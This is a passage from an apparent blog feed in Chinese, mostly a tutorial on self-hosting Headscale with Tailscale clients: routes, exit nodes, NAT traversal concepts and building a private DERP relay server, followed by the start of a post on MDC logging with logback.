服务器"我这个节点可以转发这些地址的路由"</span></span><br><span class="line">tailscale up --login-server=http://&lt;HEADSCALE_PUB_IP&gt;:8080 --accept-routes=<span class="literal">true</span> --accept-dns=<span class="literal">false</span> --advertise-routes=192.168.31.0/24 --reset</span><br><span class="line"><span class="comment"># 在 Headscale 端查看路由，可以看到相关路由是关闭的</span></span><br><span class="line">headscale nodes list</span><br><span class="line"><span class="comment"># 查看具体某台设备路由信息</span></span><br><span class="line">headscale routes list -i 1</span><br><span class="line"><span class="comment"># 开启第一条路由规则，以此类推</span></span><br><span class="line">headscale routes <span class="built_in">enable</span> -r 1</span><br><span class="line"><span class="comment"># 之前版本好像是如下命令，但在1.38这里报错</span></span><br><span class="line"><span class="comment"># 这是开启所有</span></span><br><span class="line"><span class="comment"># headscale routes enable -i 6 -a</span></span><br><span class="line"><span class="comment"># 开启特定路由</span></span><br><span class="line"><span class="comment"># headscale routes enable -i 6 -r "192.168.100.0/24,xxxx"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 其他节点查看路由结</span></span><br><span class="line">ip route show table 52|grep <span class="string">"192.168.31.0/24"</span></span><br><span class="line"><span class="comment"># 其他节点启动时需要增加 --accept-routes=true 选项来声明 “我接受外部其他节点发布的路由”</span></span><br></pre></td></tr></table></figure><p>最后是设置出口节点，如果要设置，登陆时加上<code>--advertise-exit-node</code>即可，然后在headscale可以看到<code>0.0.0.0/0</code>的路由，将其放行，最后在客户端选择<code>--exit-node=&lt;exit-node-ip&gt; </code>以及<code>--exit-node-allow-lan-access=true</code>自定义选项</p><h3 id="3-5-常用命令总结">3.5 常用命令总结</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">headscale namespace list <span class="comment"># 查看所有的namespace</span></span><br><span class="line">headscale namespace create default <span class="comment"># 创建namespace</span></span><br><span class="line">headscale namespace destroy default <span class="comment"># 删除namespace</span></span><br><span class="line">headscale namespace rename default  myspace <span class="comment"># 重命名namespace</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 老版本--namespace/-n 替换成--user</span></span><br><span class="line">headscale node list <span class="comment"># 列出所有的节点</span></span><br><span class="line">headscale node ls -t <span class="comment"># 列出所有的节点,同时显示出tag信息</span></span><br><span class="line">headscale -user default node ls <span class="comment"># 只查看namespace为default下的节点</span></span><br><span class="line">headscale node delete -i&lt;ID&gt; <span class="comment"># 根据id删除指定的节点，这里面的id是node list查询出来的id</span></span><br><span class="line">                             <span class="comment"># 参考headscale nodes delete -i=6</span></span><br><span class="line">headscale node tag -i=2 -t=tag:<span class="built_in">test</span> <span class="comment"># 给id为2的node设置tag为tag:test</span></span><br><span class="line"></span><br><span class="line">headscale routes list -i=9    <span class="comment"># 列出节点9的所有路由信息</span></span><br><span class="line">headscale routes <span class="built_in">enable</span> -i=9 -r=192.168.10.0/24  <span class="comment">#将节点9的路由中信息为192.168.10.0/24的设置为true,</span></span><br><span class="line">                              <span class="comment"># 这样除了虚拟内网ip,原先的内网ip网段为192.168.10的也能访问了</span></span><br><span class="line">                              <span class="comment"># 后面的/24表示子网掩码是24个1,就是255.255.255.0</span></span><br><span class="line"><span class="comment"># 新版本命令开启第一条路由规则，以此类推</span></span><br><span class="line">headscale routes <span class="built_in">enable</span> -r 1</span><br><span class="line"></span><br><span class="line"><span class="comment"># # 老版本--namespace/-n 替换成--user</span></span><br><span class="line"><span class="comment"># preauthkeys主要是方便客户端快速接入，创建了preauthkeys后客户端直接使用该key就可以直接加入namespace</span></span><br><span class="line"><span class="comment"># headscale -n default preauthkeys list # 查看名称为default的namespace中已经生成的preauthkeys </span></span><br><span class="line"><span class="comment"># headscale preauthkeys create -e 24h -n default # 给名称为default的namespace创建preauthkeys</span></span><br><span class="line">headscale --user default preauthkeys list </span><br><span class="line">headscale preauthkeys create -e 24h --user default</span><br></pre></td></tr></table></figure><h2 id="4、中继服务器概述-可选">4、中继服务器概述(可选)</h2><h3 id="4-1-STUN-是什么">4.1 STUN 是什么</h3><p>Tailscale 的终极目标是让两台<strong>处于网络上的任何位置</strong>的机器建立<strong>点对点连接</strong>（直连），但大部分情况下机器都位于 NAT 和防火墙后面，这时候就需要通过打洞来实现直连，也就是 NAT 穿透。NAT 按照 <strong>NAT 映射行为</strong>和<strong>有状态防火墙行为</strong>可以分为多种类型，但对于 NAT 穿透来说根本不需要关心这么多类型，只需要看 <strong>NAT 或者有状态防火墙是否会严格检查目标 Endpoint</strong>，根据这个因素，可以将 NAT 分为 <strong>Easy NAT</strong> 和 <strong>Hard NAT</strong>。</p><ul><li><p><strong>Easy NAT</strong> 及其变种称为 “Endpoint-Independent Mapping” (<strong>EIM，终点无关的映射</strong>)  </p><p>这里的 Endpoint 指的是目标 Endpoint，也就是说，有状态防火墙只要看到有客户端自己发起的出向包，就会允许相应的入向包进入，<strong>不管这个入向包是谁发进来的都可以</strong>。</p></li><li><p><strong>hard NAT</strong> 以及变种称为 “Endpoint-Dependent Mapping”（<strong>EDM，终点相关的映射</strong>）  </p><p>这种 NAT 会针对每个目标 Endpoint 来生成一条相应的映射关系。 在这样的设备上，如果客户端向某个目标 Endpoint 发起了出向包，假设客户端的公网 IP 是 2.2.2.2，那么有状态防火墙就会打开一个端口，假设是 4242。那么只有来自该目标 Endpoint 的入向包才允许通过 <code>2.2.2.2:4242</code>，其他客户端一律不允许。这种 NAT 更加严格，所以叫 Hard NAT。</p></li></ul><p>对于 Easy NAT，我们只需要提供一个第三方的服务，它能够告诉客户端“它看到的客户端的公网 ip:port 是什么”，然后将这个信息以某种方式告诉通信对端（peer），后者就知道该和哪个地址建连了！这种服务就叫 <strong>STUN</strong> (Session Traversal Utilities for NAT，NAT会话穿越应用程序)。</p><p>对于 <strong>Hard NAT</strong> 来说，STUN 就不好使了，即使 STUN 拿到了客户端的公网 <code>ip:port</code> 告诉通信对端也于事无补，因为防火墙是和 STUN 通信才打开的缺口，这个缺口只允许 STUN 的入向包进入，其他通信对端知道了这个缺口也进不来。通常企业级 NAT 都属于 Hard NAT。这种情况下可以选择一种折衷的方式：创建一个中继服务器（relay server），客户端与中继服务器进行通信，中继服务器再将包中继（relay）给通信对端。至于中继的性能，那要看具体情况了：</p><ul><li>如果能直连，那显然没必要用中继方式；</li><li>但如果无法直连，而中继路径又非常接近双方直连的真实路径，并且带宽足够大，那中继方式并不会明显降低通信质量。延迟肯定会增加一点，带宽会占用一些，但<strong>相比完全连接不上，还是可以接受的</strong>。</li></ul><h3 id="4-2-中继服务之TURN">4.2 中继服务之TURN</h3><p>TURN 即 Traversal Using Relays around NAT，这是一种经典的中继实现方式，核心理念是：</p><ul><li><strong>用户</strong>（人）先去公网上的 TURN 服务器认证，成功后后者会告诉你：“我已经为你分配了 ip:port，接下来将为你中继流量”，</li><li>然后将这个 ip:port 地址告诉对方，让它去连接这个地址，接下去就是非常简单的客户端/服务器通信模型了。</li></ul><p>与 STUN 不同，这种协议没有真正的交互性，不是很好用，因此 Tailscale 并没有采用 TURN 作为中继协议。</p><h3 id="4-3-DERP">4.3 DERP</h3><p>DERP 即 Detoured Encrypted Routing Protocol，这是 Tailscale 自研的一个协议：</p><ul><li>它是一个<strong>通用目的包中继协议，运行在 HTTP 之上</strong>，而大部分网络都是允许 HTTP 通信的。</li><li>它根据目的公钥（destination’s public key）来中继加密的流量（encrypted payloads）</li></ul><p>Tailscale 使用的算法很有趣，<strong>所有客户端之间的连接都是先选择 DERP 模式（中继模式），这意味着连接立即就能建立（优先级最低但 100% 能成功的模式），用户不用任何等待</strong>。然后开始并行地进行路径发现，通常几秒钟之后，我们就能发现一条更优路径，然后将现有连接透明升级（upgrade）过去，变成点对点连接（直连）。因此，DERP 既是 Tailscale 在 NAT 穿透失败时的保底通信方式（此时的角色与 TURN 类似），也是在其他一些场景下帮助我们完成 NAT 穿透的旁路信道。 换句话说，它既是我们的保底方式，也是有更好的穿透链路时，帮助我们进行连接升级（upgrade to a peer-to-peer connection）的基础设施。</p><h2 id="5、自建私有-DERP-server-可选">5、自建私有 DERP server(可选)</h2><h3 id="5-1-概述">5.1 概述</h3><p>Tailscale 的私钥只会保存在当前节点，因此 DERP server 无法解密流量，它只能和互联网上的其他路由器一样，呆呆地将加密的流量从一个节点转发到另一个节点，只不过 DERP 使用了一个稍微高级一点的协议来防止滥用。Tailscale 开源了 DERP 服务器的代码，如果你感兴趣，可以阅读 <a href="https://github.com/tailscale/tailscale/tree/main/derp" target="_blank" rel="noopener" title="DERP 的源代码">DERP 的源代码</a>。</p><p>Tailscale 官方内置了很多 DERP 服务器，分步在全球各地，<strong>惟独不包含中国大陆</strong>。这就导致了一旦流量通过 DERP 服务器进行中继，延时就会非常高。而且官方提供的 DERP 服务器是万人骑，存在安全隐患。为了实现低延迟、高安全性，我们可以参考 <a href="https://tailscale.com/kb/1118/custom-derp-servers/" target="_blank" rel="noopener" title="Tailscale 官方文档">Tailscale 官方文档</a>自建私有的 DERP 服务器。有两种部署模式，一种是基于域名，另外一种不需要域名，可以直接使用 IP，可以直接参考：<a href="https://icloudnative.io/posts/custom-derp-servers" target="_blank" rel="noopener" title="部署私有 DERP 中继服务器">部署私有 DERP 中继服务器</a></p><h3 id="5-2-中继服务器搭建">5.2 中继服务器搭建</h3><p>这里搭建的是官方推荐的，属于http搭建，docker搭建可以参考其他。首先需要注意的是, 在需要搭建 DERP Server 的服务器上, 请先安装一个 Tailscale 客户端并注册到 Headscale; <strong>这样做的目的是让搭建的 DERP Server 开启客户端认证, 否则你的 DERP Server 可以被任何人白嫖</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 目前 Tailscale 官方并未提供 DERP Server 的安装包, 所以需要我们自行编译安装; 在编译之前请确保安装了最新版本的 Go 语言及其编译环境.</span></span><br><span class="line"><span class="comment"># 这里我用的go编译环境是1.21</span></span><br><span class="line"><span class="comment"># install的时候可能会无法访问，需要先设置代理服务</span></span><br><span class="line">go env -w GOPROXY=https://goproxy.io,direct</span><br><span class="line"><span class="comment"># 设置不走 proxy 的私有仓库，多个用逗号相隔</span></span><br><span class="line">go env -w GOPRIVATE=*.corp.example.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译 DERP Server</span></span><br><span class="line">go install tailscale.com/cmd/derper@main</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制到系统可执行目录</span></span><br><span class="line">mv <span class="variable">$&#123;GOPATH&#125;</span>/bin/derper /usr/<span class="built_in">local</span>/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建用户和运行目录</span></span><br><span class="line">useradd \</span><br><span class="line">        --create-home \</span><br><span class="line">        --home-dir /var/lib/derper/ \</span><br><span class="line">        --system \</span><br><span class="line">        --user-group \</span><br><span class="line">        --shell /usr/sbin/nologin \</span><br><span class="line">        derper</span><br></pre></td></tr></table></figure><p>接下来创建一个 SystemD 配置，保证开机自启，这里有几个点。<strong>默认情况下 Derper Server 会监听在 <strong><strong><code>:443</code></strong></strong> 上, 同时会触发自动 ACME 申请证书. 关于证书逻辑如下:</strong></p><ul><li>如果不指定 <code>-a</code> 参数, 则默认监听 <code>:443</code></li><li>如果监听 <code>:443</code> 并且未指定 <code>--certmode=manual</code> 则会强制使用 <code>--hostname</code> 指定的域名进行 ACME 申请证书</li><li>如果指定了 <code>--certmode=manual</code> 则会使用 <code>--certmode</code> 指定目录下的证书开启 HTTPS</li><li>如果指定了 <code>-a</code> 为非 <code>:443</code> 端口, 且没有指定 <code>--certmode=manual</code> 则只监听 HTTP</li></ul><p><strong>如果期望使用 ACME 自动申请只需要不增加 <strong><strong><code>-a</code></strong></strong> 选项即可(占用 443 端口), 如果期望通过负载均衡器负载, 则需要将 <strong><strong><code>-a</code></strong></strong> 选项指定到非 443 端口, 然后配置 Nginx、Caddy 等 LB 软件即可. 最后一点 <strong><strong><code>stun</code></strong></strong> 监听的是 UDP 端口, 请确保防火墙打开此端口.</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /lib/systemd/system/derper.service</span></span><br><span class="line">[Unit]</span><br><span class="line">Description=tailscale derper server</span><br><span class="line">After=syslog.target</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line">User=derper</span><br><span class="line">Group=derper</span><br><span class="line">ExecStart=/usr/<span class="built_in">local</span>/bin/derper -c=/var/lib/derper/private.key -a=:12345 -stun-port=3456 -verify-clients</span><br><span class="line">Restart=always</span><br><span class="line">RestartSec=5</span><br><span class="line"></span><br><span class="line"><span class="comment"># Optional security enhancements</span></span><br><span class="line">NoNewPrivileges=yes</span><br><span class="line">PrivateTmp=yes</span><br><span class="line">ProtectSystem=strict</span><br><span class="line">ProtectHome=yes</span><br><span class="line">ReadWritePaths=/var/lib/derper /var/run/derper</span><br><span class="line">AmbientCapabilities=CAP_NET_BIND_SERVICE</span><br><span class="line">RuntimeDirectory=derper</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><p>然后启动derp服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重新加载</span></span><br><span class="line">systemctl daemon-reload</span><br><span class="line"><span class="comment"># 开启</span></span><br><span class="line">systemctl <span class="built_in">enable</span> derper --now</span><br><span class="line"><span class="comment"># 重启的话，stop</span></span><br><span class="line">systemctl restart derper.service</span><br></pre></td></tr></table></figure><h3 id="5-3-配置-Headscale">5.3 配置 Headscale</h3><p>在创建完 Derper 中继服务器后, 我们还需要配置 Headscale 来告诉所有客户端在必要时可以使用此中继节点进行通信; 为了达到这个目的, 我们需要在 Headscale 服务器上创建以下配置，<code>vim /etc/headscale/derper.yaml</code>，配置说明：</p><ul><li><code>regions</code> 是 YAML 中的<strong>对象</strong>，下面的每一个对象表示一个<strong>可用区</strong>，每个<strong>可用区</strong>里面可设置多个 DERP 节点，即 <code>nodes</code>。</li><li>每个可用区的 <code>regionid</code> 不能重复。</li><li>每个 <code>node</code> 的 <code>name</code> 不能重复。</li><li><code>regionname</code> 一般用来描述可用区，<code>regioncode</code> 一般设置成可用区的缩写。</li><li><code>ipv4</code> 字段不是必须的，如果你的域名可以通过公网解析到你的 DERP 服务器地址，这里可以不填。如果你使用了一个二级域名，而这个域名你并没有在公共 DNS server 中添加相关的解析记录，那么这里就需要指定 IP（前提是你的证书包含了这个二级域名，这个很好支持，搞个泛域名证书就行了）。</li><li><code>stunonly: false</code> 表示除了使用 STUN 服务，还可以使用 DERP 服务。</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/headscale/derper.yaml</span></span><br><span class="line"></span><br><span class="line"><span class="attr">regions:</span></span><br><span class="line">  <span class="attr">901:</span></span><br><span class="line">    <span class="attr">regionid:</span> <span class="number">901</span></span><br><span class="line">    <span class="attr">regioncode:</span> <span class="string">private-derper</span></span><br><span class="line">    <span class="attr">regionname:</span> <span class="string">"My Private Derper Server"</span></span><br><span class="line">    <span class="attr">nodes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">private-derper</span></span><br><span class="line">        <span class="attr">regionid:</span> <span class="number">901</span></span><br><span class="line">        <span class="comment"># 自行更改为自己的域名，也可以直接用ip</span></span><br><span class="line">        <span class="attr">hostname:</span> <span class="string">derper.xxxxx.com</span></span><br><span class="line">        <span class="comment"># Derper 节点的 IP</span></span><br><span class="line">        <span class="attr">ipv4:</span> <span class="number">121.199</span><span class="number">.167</span><span class="string">.xxx</span></span><br><span class="line">        <span class="comment"># Derper 设置的 STUN 端口</span></span><br><span class="line">        <span class="attr">stunport:</span> <span class="number">3456</span></span><br><span class="line">        <span class="comment">#derpport: 12345</span></span><br><span class="line">        <span class="comment">#stunonly: false</span></span><br></pre></td></tr></table></figure><p>在创建好基本的 Derper Server 节点信息配置后, 我们需要调整主配置来让 Headscale 加载</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">derp:</span></span><br><span class="line">  <span class="attr">server:</span></span><br><span class="line">    <span class="comment"># 这里关闭 Headscale 默认的 Derper Server</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># urls 留空, 保证不加载官方的默认 Derper，也可以加其他的，或者json可以在线修改</span></span><br><span class="line">  <span class="attr">urls:</span></span><br><span class="line">   <span class="comment"># - https://lamppic.oss-cn-hangzhou.aliyuncs.com/test/perf.json</span></span><br><span class="line">   <span class="comment"># - https://controlplane.tailscale.com/derpmap/default</span></span><br><span class="line">  <span class="comment"># 这里填写 Derper 节点信息配置的绝对路径</span></span><br><span class="line">  <span class="attr">paths:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">/etc/headscale/derper.yaml</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># If enabled, a worker will be set up to periodically</span></span><br><span class="line">  <span class="comment"># refresh the given sources and update the derpmap</span></span><br><span class="line">  <span class="comment"># will be set up.</span></span><br><span class="line">  <span class="attr">auto_update_enabled:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># How often should we check for DERP updates?</span></span><br><span class="line">  <span class="attr">update_frequency:</span> <span class="string">24h</span></span><br></pre></td></tr></table></figure><h3 id="5-4-客户端网络调试">5.4 客户端网络调试</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看derp也没有成功,注意防火墙开放</span></span><br><span class="line">http://121.199.167.xxx:12345/</span><br><span class="line"></span><br><span class="line"><span class="comment"># Ping 命令</span></span><br><span class="line"><span class="comment"># tailscale ping 命令可以用于测试 IP 连通性, 同时可以看到时如何连接目标节点的. 默认情况下 Ping 命令首先会使用 Derper 中继节点通信, 然后尝试 P2P 连接; 一旦 P2P 连接成功则自动停止 Ping</span></span><br><span class="line"><span class="comment"># 由于其先走 Derper 的特性也可以用来测试 Derper 连通性</span></span><br><span class="line">tailscale ping 10.1.0.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># Status 命令</span></span><br><span class="line"><span class="comment"># 通过 tailscale status 命令可以查看当前节点与其他对等节点的连接方式, 通过此命令可以查看到当前节点可连接的节点以及是否走了 Derper 中继</span></span><br><span class="line">tailscale status</span><br><span class="line"></span><br><span class="line"><span class="comment"># NetCheck 命令</span></span><br><span class="line"><span class="comment"># 有些情况下我们可以确认是当前主机的网络问题导致没法走 P2P 连接, 但是我们又想了解一下当前的网络环境; 此时可以使用 tailscale netcheck 命令来检测当前的网络环境, 此命令将会打印出详细的网络环境报告</span></span><br><span class="line">tailscale netcheck</span><br></pre></td></tr></table></figure><h3 id="5-5-Docker-Compose-安装-可选">5.5 Docker Compose 安装(可选)</h3><p>该镜像默认开启了客户端验证, 所以请确保 <code>/var/run/tailscale</code> 内存在已加入 Headscale 成功的 tailscaled 实例的 sock 文件</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'3.9'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">derper:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mritd/derper</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">derper</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"8080:8080/tcp"</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"3456:3456/udp"</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">TZ:</span> <span class="string">Asia/Shanghai</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/etc/timezone:/etc/timezone</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/var/run/tailscale:/var/run/tailscale</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">data:/var/lib/derper</span></span><br><span class="line"><span class="attr">volumes:</span></span><br><span class="line">  <span class="attr">data:</span></span><br></pre></td></tr></table></figure><hr><p>参考文章：</p><p><a href="https://www.jianshu.com/p/3a19483f2879" target="_blank" rel="noopener" title="https://www.jianshu.com/p/3a19483f2879">https://www.jianshu.com/p/3a19483f2879</a></p><p><a href="https://www.cnblogs.com/jonnyan/p/14175136.html" target="_blank" rel="noopener" title="https://www.cnblogs.com/jonnyan/p/14175136.html">https://www.cnblogs.com/jonnyan/p/14175136.html</a></p><p><a href="https://imnks.com/5534.html" target="_blank" rel="noopener" title="https://imnks.com/5534.html">https://imnks.com/5534.html</a></p><p><a href="https://tailscale.com/kb/" target="_blank" rel="noopener" title="https://tailscale.com/kb/">https://tailscale.com/kb/</a></p><p><a href="https://mritd.com/2022/10/19/use-headscale-to-build-a-p2p-network" target="_blank" rel="noopener" title="https://mritd.com/2022/10/19/use-headscale-to-build-a-p2p-network">https://mritd.com/2022/10/19/use-headscale-to-build-a-p2p-network</a></p><p><a href="https://icloudnative.io/posts/how-to-set-up-or-migrate-headscale" target="_blank" rel="noopener" title="https://icloudnative.io/posts/how-to-set-up-or-migrate-headscale">https://icloudnative.io/posts/how-to-set-up-or-migrate-headscale</a></p><p><a href="https://icloudnative.io/posts/custom-derp-servers/" target="_blank" rel="noopener" title="https://icloudnative.io/posts/custom-derp-servers/">https://icloudnative.io/posts/custom-derp-servers/</a></p>]]></content>
    
    
    <summary type="html">&lt;h1&gt;一、内网穿透概述&lt;/h1&gt;
&lt;h2 id=&quot;1、传统内网穿透介绍&quot;&gt;1、传统内网穿透介绍&lt;/h2&gt;
&lt;p&gt;传统内网穿透的方式为：内网设备&amp;lt;——&amp;gt;中转服务器&amp;lt;———&amp;gt;网络设备（手机、电脑），例如frp，nps，可以参考：&lt;a href=&quot;https://blog.csdn.net/lemon_TT/article/details/124675640&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; title=&quot;内网穿透工具&quot;&gt;内网穿透工具&lt;/a&gt;；但是这种方法弊端也很明显&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;中转服务器需要一定的费用进行支撑(带公网的云服务器)，如果是外网的服务器还可能存在被墙的风险&lt;/li&gt;
&lt;li&gt;中转服务器直接决定了中转的&amp;quot;速度&amp;quot;，而这个&amp;quot;速度&amp;quot;越快其对应的服务器带宽就越大，通常来说价格就越高&lt;/li&gt;
&lt;li&gt;需要一定的知识储备来搭建内网穿透的服务端，而且只能转发某个特定的端口&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://blog.shawncoding.top/categories/Linux/"/>
    
    
    <category term="网络" scheme="https://blog.shawncoding.top/tags/%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>MDC学习笔记</title>
    <link href="https://blog.shawncoding.top/posts/ce853490.html"/>
    <id>https://blog.shawncoding.top/posts/ce853490.html</id>
    <published>2023-06-28T14:20:27.000Z</published>
    <updated>2023-06-28T14:27:09.214Z</updated>
    
    <content type="html"><![CDATA[<h1>一、MDC日志定位</h1><h2 id="1、概述">1、概述</h2><h3 id="1-1-简介">1.1 简介</h3><p>MDC是可以帮组我们 在多线程条件下记录追踪日志的功能，它支持 Log4J和LogBack 两种日志框架通常打印出的日志会有线程号等信息来标志当前日志属于哪个线程，然而由于线程是可以重复使用的，所以并不能很清晰的确认一个请求的日志范围。处理这种情况一般有两种处理方式：</p><ul><li>手动生成一个唯一序列号打印在日志中；</li><li>使用日志控件提供的MDC功能，生成一个唯一序列标记一个线程的日志</li></ul><p>在现网出现故障时，我们经常需要获取一次请求流程里的所有日志进行定位。如果请求只在一个线程里处理，则我们可以通过线程ID来过滤日志，但同时如果请求包含异步线程的处理，那么光靠线程ID就显得捉襟见肘了，这也是需要解决的一个问题</p><a id="more"></a><h3 id="1-2-MDC原理">1.2 MDC原理</h3><p><strong>MDC 可以看成是一个与当前线程绑定的哈希表</strong>，可以往其中添加键值对。MDC 中包含的内容可以被同一线程中执行的代码所访问。当前线程的子线程会继承其父线程中的 MDC 的内容。当需要记录日志时，只需要从 MDC 中获取所需的信息即可。MDC 的内容则由程序在适当的时候保存进去。对于一个 Web 应用来说，通常是在请求被处理的最开始保存这些数据。</p><p>如果是微服务之间的调用，则需要上层服务在 header 中添加标识同请求一起传输过来。下层服务直接使用上层服务的标识，就可以将日志串联起来</p><h2 id="2、MDC入门">2、MDC入门</h2><h3 id="2-1-配置日志文件">2.1 配置日志文件</h3><p>在resources下配置logback.xml，设置输出格式，默认是不会输出的</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">"CONSOLE"</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.ConsoleAppender"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">layout</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.classic.PatternLayout"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--&lt;pattern&gt;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%X&#123;trace_id&#125;] [%level] [%thread] [%class:%line] - %m%n&lt;/pattern&gt;--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] [requestId=%X&#123;requestId&#125;] %-5level %logger&#123;50&#125; - %msg%n<span class="tag">&lt;/<span class="name">Pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">layout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">"debug"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span 